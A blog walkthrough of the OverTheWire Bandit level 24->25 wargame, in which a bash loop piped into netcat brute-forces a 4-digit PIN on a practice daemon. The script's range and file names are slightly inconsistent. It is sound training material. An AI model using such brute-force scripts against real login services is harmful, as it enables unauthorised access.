---
title: OverTheWire Bandit Level 24 -> 25
author: Michael McDonagh
pubDatetime: 2025-03-01T22:55:00Z
slug: overthewire-bandit-25
featured: false
draft: false
tags:
  - overthewire
  - bandit
  - linux
ogImage: ""
description: Solution for OverTheWire Bandit level 25 challenge.
---

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

---

## Walkthrough

Solution for the Overthewire.org [Bandit level 24 -> 25](https://overthewire.org/wargames/bandit/bandit25.html)

Login to the server using the password obtained from the previous level [Bandit level 23 -> 24](/posts/overthewire-bandit-24).  

username: `bandit24`  

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

For this challenge we need to send a password to a specific port on localhost, we have done this before on previous levels but the difference this time is that we need to send a 4 digit pincode with the password.  
Unfortunately we do not know what the pincode is so we will need to try all possible combinations until we get the right one.

The first thing to do is to connect to port 30002 and see what it is doing.  
We can use netcat to connect to port 30002 on localhost.

```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. 
Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTr########################## 1234
Wrong! Please enter the correct pincode. Try again.

Fail! You did not supply enough data. Try again.
UoMYTr 124
Wrong! Please enter the correct current password. Try again.

bandit24@bandit:~$
```

What we can see is that the daemon running on port 30002 wants the data entered in a specific format.  
```<BANDIT24 PASSWORD> <4 DIGIT PIN>```

The daemon first checks if the password is correct before checking the pincode.  
If the password is incorrect we get a message stating that the password was incorrect. The pincode is not checked.  
If the password is correct and the pincode is incorrect we get a different message stating the pincode is incorrect.
Since we are using the same password used to login to this level we should not see the password incorrect message.

The daemon wants a 4 digit pincode so we need to check all pincodes from 0000 to 9999 to find the correct one.  
Doing this by hand would take a long time (10,000 pincodes to check). It is more efficient to create a program to do this for us.

First lets create a directory in `/tmp` to work from

```bash
bandit24@bandit:~$ mkdir /tmp/work_dir
bandit24@bandit:~$ cd /tmp/work_dir
bandit24@bandit:/tmp/work_dir$
```

Now to create a bash script to create all 10,000 password pincode combinations we need to test.
I used vim to create a file try_passwords.sh and wrote this code into it.

```bash
#!/bin/bash

for i in {000..9999}
do
    echo UoMYTr************************** $i 
done
```

The code will create all 4 digit pincodes we need.
Next we need to give the file execute permissions

```bash
bandit24@bandit:/tmp/work_dir$ chmod +x try_password.sh
```

Now all thats left is to run the bash script and send it's output to netcat.  
This will run for a while as it is trying 10,000 pincodes but eventually you will see the correct message and get the password for bandit25.

```bash
bandit24@bandit:/tmp/work_dir$ ./try_pass.sh | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O5##########################

Exiting.
bandit24@bandit:/tmp/work_dir$
```
